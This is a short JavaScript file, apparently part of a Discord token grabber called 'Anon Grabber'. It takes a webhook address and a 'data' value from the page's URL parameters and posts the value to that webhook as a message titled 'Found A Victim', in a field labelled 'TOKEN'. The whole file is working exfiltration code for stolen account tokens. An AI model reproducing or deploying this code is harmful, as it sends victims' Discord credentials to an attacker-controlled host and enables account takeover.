let param = (new URL(document.location)).searchParams;
var wh = param.get("wh");
var msg = param.get("data");
var request = new XMLHttpRequest();
request.open("POST", wh);
request.setRequestHeader('Content-type', 'application/json');
var params = {
    username: "Anon Grabber",
    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1200px-Anonymous_emblem.svg.png",
    embeds: [{
        title: "Found A Victim",
        description: "Found A victim on discord using Anon Grabber",
        fields: [{
            name: "Username",
            value: "Unknown",
            inline: !1
        }, {
            name: "TOKEN",
            value: msg,
            inline: !1
        }]
    }],
};
request.send(JSON.stringify(params));
